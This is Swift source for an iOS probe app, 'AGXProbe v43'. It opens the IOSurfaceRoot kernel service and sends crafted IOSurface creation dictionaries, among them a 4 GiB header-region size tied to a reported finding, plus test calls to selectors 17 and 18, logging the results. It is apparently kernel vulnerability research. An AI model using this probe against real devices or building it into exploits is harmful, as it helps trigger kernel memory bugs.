import SwiftUI
import Darwin

@main
struct AGXProbeApp: App {
    var body: some Scene { WindowGroup { ContentView() } }
}

struct ContentView: View {
    @StateObject private var vm = ReachViewModel()
    var body: some View {
        VStack(spacing: 12) {
            Text("AGXProbe v43 — SKVLENT comparison + sel17/sel18 (17 Pro)").font(.headline)
            Text("HBR=0x100000000 + selectors 17/18").font(.caption2).foregroundColor(.secondary)
            ScrollView {
                Text(vm.log)
                    .font(.system(size: 9, design: .monospaced))
                    .foregroundColor(.green)
                    .frame(maxWidth: .infinity, alignment: .leading)
                    .padding(6).background(Color.black.opacity(0.85)).cornerRadius(6)
            }
            Button(action: { Task { await vm.runProbe() } }) {
                Text(vm.isRunning ? "Probing..." : "Run v43")
                    .font(.headline).foregroundColor(.white)
                    .frame(maxWidth: .infinity).padding(10)
                    .background(vm.isRunning ? Color.gray : Color.blue).cornerRadius(8)
            }.disabled(vm.isRunning)
            Text("Status: \(vm.status)").font(.caption2).foregroundColor(.secondary)
            Spacer(minLength: 0)
        }
        .padding().task { await vm.autoRunIfRequested() }
    }
}

@MainActor
final class ReachViewModel: ObservableObject {
    @Published var log = ""
    @Published var status = "Ready"
    @Published var isRunning = false
    private var didAutoRun = false

    private let logFileURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("reach.log")
    }()

    private func log(_ m: String) {
        log += m + "\n"; print(m); fflush(stdout)
        try? log.write(to: logFileURL, atomically: true, encoding: .utf8)
    }

    func autoRunIfRequested() async {
        guard !didAutoRun else { return }
        didAutoRun = true
        if ProcessInfo.processInfo.arguments.contains("--autorun") { await runProbe() }
    }

    private func stripNul(_ data: Data, tag: String) -> Data? {
        guard let s = String(data: data, encoding: .utf8) else { return nil }
        guard let a = s.range(of: "<\(tag)"),
              let b = s.range(of: "</\(tag)>", options: .backwards) else { return nil }
        return (String(s[a.lowerBound..<b.upperBound]).data(using: .utf8) ?? Data()) + Data([0])
    }

    private func xmlNul(_ d: Any) -> Data? {
        guard let data = try? PropertyListSerialization.data(fromPropertyList: d, format: .xml, options: 0) else { return nil }
        return data + Data([0])
    }

    private func num(_ v: UInt64) -> Int64 { Int64(bitPattern: v) }

    private func plane(off: UInt64, size: UInt64, bpr: UInt64, bpe: UInt64) -> [String: Any] {
        return [
            "IOSurfacePlaneWidth": 64,
            "IOSurfacePlaneHeight": 64,
            "IOSurfacePlaneBytesPerRow": num(bpr),
            "IOSurfacePlaneBytesPerElement": num(bpe),
            "IOSurfacePlaneOffset": num(off),
            "IOSurfacePlaneSize": num(size),
        ]
    }

    private func surf(_ alloc: UInt64, _ planes: [[String: Any]], _ extra: [String: Any]) -> [String: Any] {
        var d: [String: Any] = [
            "IOSurfaceWidth": 64,
            "IOSurfaceHeight": 64,
            "IOSurfaceBytesPerElement": 4,
            "IOSurfaceBytesPerRow": 256,
            "IOSurfaceAllocSize": num(alloc),
            "IOSurfacePixelFormat": 0x42475241,
            "IOSurfacePlaneInfo": planes,
        ]
        for (k, v) in extra { d[k] = v }
        return d
    }

    private func callIO(_ conn: io_connect_t, sel: UInt32, scalars: [UInt64], sdata: [UInt8], outSize: Int) -> (UInt32, [UInt8]) {
        var inScalar = [UInt64](repeating: 0, count: 4)
        for i in 0..<scalars.count { inScalar[i] = scalars[i] }
        var outScalar = [UInt64](repeating: 0, count: 8)
        var outScalarCount: UInt32 = 0
        var outBuff = [UInt8](repeating: 0xCC, count: max(outSize, 1))
        var outSz: Int = outSize
        let kr: Int32 = sdata.withUnsafeBytes { raw in
            outBuff.withUnsafeMutableBytes { ob in
                IOConnectCallMethod(conn, sel,
                                    &inScalar, UInt32(scalars.count),
                                    raw.baseAddress, sdata.count,
                                    &outScalar, &outScalarCount,
                                    ob.baseAddress, &outSz)
            }
        }
        let k = UInt32(bitPattern: kr)
        var outBytes = [UInt8](outBuff.prefix(Int(outSz)))
        return (k, outBytes)
    }

    private func idFrom(_ out: [UInt8]) -> UInt32? {
        guard out.count >= 0x1C else { return nil }
        return UInt32(out[0x18]) | (UInt32(out[0x19]) << 8) | (UInt32(out[0x1A]) << 16) | (UInt32(out[0x1B]) << 24)
    }

    private func u64(_ out: [UInt8], _ o: Int) -> UInt64 {
        guard out.count >= o + 8 else { return 0 }
        var v: UInt64 = 0
        for i in 0..<8 { v |= UInt64(out[o + i]) << (8 * i) }
        return v
    }

    private func probeService(_ name: String, _ type: UInt32) {
        let service = IOServiceGetMatchingService(kIOMainPortDefault, IOServiceMatching(name))
        guard service != 0 else { log("\(name): service NOT FOUND"); return }
        log("\(name): service found")
        var conn: io_connect_t = 0
        let okr = IOServiceOpen(service, mach_task_self_, type, &conn)
        IOObjectRelease(service)
        if okr != 0 { log("\(name) type=\(type): IOServiceOpen kr=0x\(String(okr, radix:16))"); return }
        log("\(name) type=\(type): IOServiceOpen ok conn=0x\(String(conn, radix:16))")
        defer { IOServiceClose(conn) }

        // SKVLENT finding #01: HBR=0x100000000 (4 GiB)
        log("\n--- sel0: SKVLENT HBR=0x100000000 (4 GiB) ---")
        var extraSKV: [String: Any] = [
            "IOSurfaceSliceCount": 4,
            "IOSurfacePlaneDataRegionBytesPerSlice": num(0x4000),
            "IOSurfacePlaneHeaderRegionBytesPerSlice": num(0x100000000),
            "IOSurfacePlaneSize": num(0x10000),
        ]
        let dictSKV = surf(0x4000, [plane(off: 0, size: 0x1000, bpr: 256, bpe: 4)], extraSKV)
        guard let fullSKV = xmlNul(dictSKV), let pSKV = stripNul(fullSKV, tag: "dict") else {
            log("serialize failed"); return
        }
        let pSKVBytes = Array(pSKV)
        let (kSKV, outSKV) = callIO(conn, sel: 0, scalars: [0], sdata: pSKVBytes, outSize: 0xC68)
        log("sel0 HBR=0x100000000: kr=0x\(String(kSKV, radix:16)) outSz=\(outSKV.count)")
        if kSKV == 0, let sid = idFrom(outSKV) {
            log("  surface id=\(sid) a0=0x\(String(u64(outSKV, 0x00), radix:16)) alloc=0x\(String(u64(outSKV, 0x20), radix:16)) planes=\(u64(outSKV, 0x58))")
        } else {
            log("  create FAILED - no surface created")
        }

        // sel17 test (0x11)
        log("\n--- sel17 (0x11) ---")
        let payload17: [UInt8] = [0] + [UInt8](repeating: 0, count: 12) + [0]
        let (k17, out17) = callIO(conn, sel: 17, scalars: [0], sdata: payload17, outSize: 0x1000)
        log("sel17: kr=0x\(String(k17, radix:16)) outSz=\(out17.count)")

        // sel18 test (0x12)
        log("\n--- sel18 (0x12) ---")
        let payload18: [UInt8] = [0] + [UInt8](repeating: 0, count: 12) + [0]
        let (k18, out18) = callIO(conn, sel: 18, scalars: [0], sdata: payload18, outSize: 0x1000)
        log("sel18: kr=0x\(String(k18, radix:16)) outSz=\(out18.count)")

        log("\n=== done ===")
        status = "Complete"; isRunning = false
    }

    func runProbe() async {
        isRunning = true; status = "Probing..."; log = ""
        try? "".write(to: logFileURL, atomically: true, encoding: .utf8)
        log("=== AGXProbe v43 — SKVLENT comparison + sel17/sel18 ===")

        probeService("IOSurfaceRoot", 0)

        log("\n=== done ===")
        status = "Complete"; isRunning = false
    }
}
